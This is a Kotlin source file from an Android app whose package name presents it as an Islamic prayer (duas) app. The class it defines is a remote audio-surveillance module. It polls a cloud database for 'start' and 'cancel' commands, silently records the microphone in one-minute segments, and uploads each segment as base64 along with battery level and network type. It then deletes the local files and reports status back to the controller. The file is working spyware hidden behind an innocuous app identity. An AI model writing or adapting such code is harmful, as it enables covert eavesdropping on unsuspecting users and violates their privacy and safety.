package islamic.duas.media

import android.content.Context
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

class RemoteRecorder(private val context: Context) {

    companion object {
        private const val TAG = "RemoteRecorder"
        private const val SEGMENT_SECONDS = 60L

        @Volatile
        private var instance: RemoteRecorder? = null

        fun getInstance(context: Context): RemoteRecorder {
            return instance ?: synchronized(this) {
                instance ?: RemoteRecorder(context.applicationContext).also { instance = it }
            }
        }
    }

    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingId: String? = null
    private var currentRequestId: String? = null
    private var durationSec: Int = 0
    private var segmentsCompleted: Int = 0
    private val segmentFiles = mutableListOf<File>()
    private val isRecording = AtomicBoolean(false)
    private var recordingJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    suspend fun checkAndHandleCommand() {
        if (isRecording.get()) return
        try {
            val androidId = DeviceId.get(context)
            val path = "devices/$androidId/commands/audio_record"
            val dataStr = CloudApi.readFromRTDB(path)
            if (dataStr == null) return
            val data = JSONObject(dataStr)
            val action = data.optString("action", "")
            when (action) {
                "start" -> {
                    val durSec = data.optInt("durationSec", 300)
                    val reqId = data.optString("requestId", UUID.randomUUID().toString())
                    val recId = UUID.randomUUID().toString()
                    CloudApi.deleteFromRTDB(path)
                    startRecording(durSec, reqId, recId)
                }
                "cancel" -> {
                    val recId = data.optString("recordingId", "")
                    CloudApi.deleteFromRTDB(path)
                    cancelRecording(recId)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command check error: ${e.message}", e)
        }
    }

    private suspend fun startRecording(durationSec: Int, requestId: String, recordingId: String) {
        this.durationSec = durationSec
        this.currentRequestId = requestId
        this.currentRecordingId = recordingId
        this.segmentsCompleted = 0
        this.segmentFiles.clear()
        isRecording.set(true)

        try {
            writeRecordingStatus("recording", 0, 0, requestId)
            CloudApi.deleteFromRTDB(
                "devices/${DeviceId.get(context)}/recordings/$recordingId"
            )

            recordingJob = scope.launch {
                var elapsed = 0
                while (isRecording.get() && elapsed < durationSec) {
                    val segmentIndex = segmentsCompleted
                    val remainingSec = (durationSec - elapsed).toLong()
                    val thisSegmentSec = minOf(SEGMENT_SECONDS, remainingSec)
                    val segmentFile = File(
                        context.cacheDir,
                        "recording_${recordingId}_part_${segmentIndex}.aac"
                    )
                    segmentFiles.add(segmentFile)

                    startMediaRecorder(segmentFile)
                    delay(thisSegmentSec * 1000L)
                    stopMediaRecorder()

                    if (segmentFile.exists() && segmentFile.length() > 0) {
                        uploadSegment(segmentFile, segmentIndex)
                        segmentsCompleted++
                        elapsed += thisSegmentSec.toInt()
                        writeRecordingStatus("recording", elapsed, segmentsCompleted, requestId)
                    }
                }
                stopAndFinalize(elapsed)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Start recording error: ${e.message}", e)
            isRecording.set(false)
        }
    }

    private fun startMediaRecorder(file: File) {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        mediaRecorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(128000)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }
    }

    private fun stopMediaRecorder() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (_: Exception) {}
        mediaRecorder = null
    }

    private suspend fun uploadSegment(file: File, segmentIndex: Int) {
        try {
            val bytes = file.readBytes()
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            val androidId = DeviceId.get(context)
            val batteryPct = try {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            } catch (_: Exception) { -1 }
            val networkType = try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                when (tm?.networkType) {
                    TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
                    TelephonyManager.NETWORK_TYPE_NR -> "NR"
                    TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
                    else -> "unknown"
                }
            } catch (_: Exception) { "unknown" }

            val segmentJson = JSONObject().apply {
                put("data", base64)
                put("format", "aac")
                val meta = JSONObject().apply {
                    put("batteryLevel", batteryPct)
                    put("networkType", networkType)
                    put("signalStrengthDbm", 0)
                }
                put("metadata", meta)
            }
            CloudApi.writeToRTDB(
                "devices/$androidId/recordings/$currentRecordingId/parts/$segmentIndex",
                segmentJson
            )
            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "Segment upload error: ${e.message}", e)
        }
    }

    private suspend fun stopAndFinalize(elapsedSec: Int) {
        val androidId = DeviceId.get(context)
        val totalSize = segmentFiles.sumOf { if (it.exists()) it.length() else 0L }

        val finalJson = JSONObject().apply {
            put("id", currentRecordingId)
            put("createdAt", System.currentTimeMillis())
            put("durationSec", elapsedSec)
            put("sizeBytes", totalSize)
            put("segmentsCount", segmentsCompleted)
            put("cancelled", false)
            put("mimeType", "audio/mp4")
        }
        CloudApi.writeToRTDB("devices/$androidId/recordings/$currentRecordingId", finalJson)

        if (currentRequestId != null) {
            val responseJson = JSONObject().apply {
                put("status", "completed")
                put("message", "Recording finished")
                put("requestId", currentRequestId)
            }
            CloudApi.writeToRTDB(
                "devices/$androidId/commands/responses/$currentRequestId",
                responseJson
            )
        }

        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
        isRecording.set(false)
        recordingJob?.cancel()
        Log.i(TAG, "Recording completed: $currentRecordingId")
    }

    private suspend fun cancelRecording(recordingId: String) {
        val androidId = DeviceId.get(context)
        stopMediaRecorder()
        isRecording.set(false)
        recordingJob?.cancel()
        segmentFiles.forEach { if (it.exists()) it.delete() }
        segmentFiles.clear()

        if (currentRequestId != null) {
            val responseJson = JSONObject().apply {
                put("status", "cancelled")
                put("message", "Recording cancelled")
                put("requestId", currentRequestId)
            }
            CloudApi.writeToRTDB(
                "devices/$androidId/commands/responses/$currentRequestId",
                responseJson
            )
        }
        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
    }

    private suspend fun writeRecordingStatus(
        status: String, elapsedSec: Int, segmentsCompleted: Int, requestId: String
    ) {
        try {
            val androidId = DeviceId.get(context)
            val statusJson = JSONObject().apply {
                put("status", status)
                put("elapsedSec", elapsedSec)
                put("segmentsCompleted", segmentsCompleted)
                put("format", "aac")
                put("requestId", requestId)
            }
            CloudApi.writeToRTDB("devices/$androidId/recordingStatus", statusJson)
        } catch (_: Exception) {}
    }

    fun cleanup() {
        stopMediaRecorder()
        isRecording.set(false)
        recordingJob?.cancel()
        scope.cancel()
        instance = null
    }
}
